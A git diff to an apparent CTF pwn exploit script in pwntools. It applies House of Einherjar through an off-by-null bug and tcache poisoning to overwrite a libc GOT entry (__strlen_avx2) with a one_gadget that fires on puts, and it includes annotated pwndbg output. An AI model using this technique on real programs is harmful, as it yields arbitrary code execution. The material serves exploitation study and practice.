@@ -117,6 +117,7 @@ def xpl(**kwargs):
     free(9)
 
     """
+    House of Einherjar
     Off by null
     """
     fchk_addr = heap_base + 0x2a0
@@ -190,17 +191,38 @@ def xpl(**kwargs):
     """
     Hijack libc got
 
+    Program calls puts, so we dive into its call flow:
+     ► 0x7ffff7c80e50 <puts>       endbr64
+       ...
+       0x7ffff7c80e63 <puts+19>    call   *ABS*+0xa86a0@plt           <*ABS*+0xa86a0@plt>
+
+       0x7ffff7c28490 <*ABS*+0xa86a0@plt>:  endbr64
+       0x7ffff7c28494 <*ABS*+0xa86a0@plt+4>:        bnd jmp QWORD PTR [rip+0x1f1bfd]        # 0x7ffff7e1a098 <*ABS*@got.plt>
+       0x7ffff7c2849b <*ABS*+0xa86a0@plt+11>:       nop    DWORD PTR [rax+rax*1+0x0]
+
+    So, 0x7ffff7e1a098 is our target:
+ 
     00:0000│  0x7ffff7fa7090 (*ABS*@got.plt) —▸ 0x7ffff7f2c040 (__strncpy_avx2)
     01:0008│  0x7ffff7fa7098 (*ABS*@got.plt) —▸ 0x7ffff7f2a7e0 (__strlen_avx2) ◂— TARGET
     bypass: "malloc(): unaligned tcache chunk detected"
+
+    pwndbg> dist 0x7ffff7e1a000 0x7ffff7e1a098
+    0x7ffff7e1a000->0x7ffff7e1a098 is 0x98 bytes (0x13 words)
     """
-    libc_got = libc_base + 0x21a090
+    libc.address = libc_base
+    plt0 = libc.address + libc.get_section_by_name(".plt").header.sh_addr
+    got0 = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
+    pa(plt0)
+    pa(got0)
+    # gp("b puts")
+
+    target_got = got0 + 0x98
+
     pl = flat({
         0x80: 0,
-        0x88: libc_got,  # tcache[0x30] @heap_base+0x98
+        0x88: target_got & ~0xf,  # tcache[0x30] @heap_base+0x98
         },filler=b"\x07\0")
     alloc(5, 0x1f8, pl)
-
     """
     One gadget:
 
@@ -208,6 +230,9 @@ def xpl(**kwargs):
     constraints:
       address rbp-0x78 is writable
       [r10] == NULL || r10 == NULL || r10 is a valid argv
+
+    libc got entry for __strlen_avx2 is overwritten with one gadget
+    Triggered when puts called
     """
     ogg = libc_base + 0xebc85
     alloc(6, 0x28, p64(ogg)*2)
